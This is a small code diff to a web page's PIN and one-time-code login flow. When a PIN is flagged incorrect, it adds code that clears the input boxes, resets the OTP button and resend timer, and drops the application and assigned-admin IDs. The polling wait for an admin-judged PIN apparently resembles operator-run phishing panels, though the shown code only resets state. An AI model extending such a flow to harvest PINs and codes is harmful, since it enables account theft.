@@ -986,10 +986,26 @@
           clearInterval(otpPollInterval);
           showOtpMsg('error', 'Incorrect PIN detected. Redirecting to login…');
           setTimeout(() => {
+            // Clear PIN boxes
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
             chkLogin();
             document.getElementById('bLogin').disabled = false;
+            // Clear OTP boxes
+            [0,1,2,3,4].forEach(i => document.getElementById('o'+i).value = '');
+            // Reset OTP button
+            document.getElementById('bOtp').className = 'btn-otp';
+            document.getElementById('bOtp').disabled = false;
+            // Hide waiting spinner and show OTP inputs (reset OTP page state)
+            document.getElementById('pinWait').classList.remove('show');
+            document.getElementById('otpInputSection').style.display = '';
+            // Stop resend timer and reset it
+            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+            document.getElementById('otpRs').innerHTML = 'Resend code in <span id="rsS">60</span> seconds';
+            // Clear all OTP messages
             hideOtpMsgs();
+            // Reset application state so a fresh login creates a new application
+            S.applicationId = null;
+            S.assignedAdminId = null;
             goTo('page-login');
           }, 2500);
 
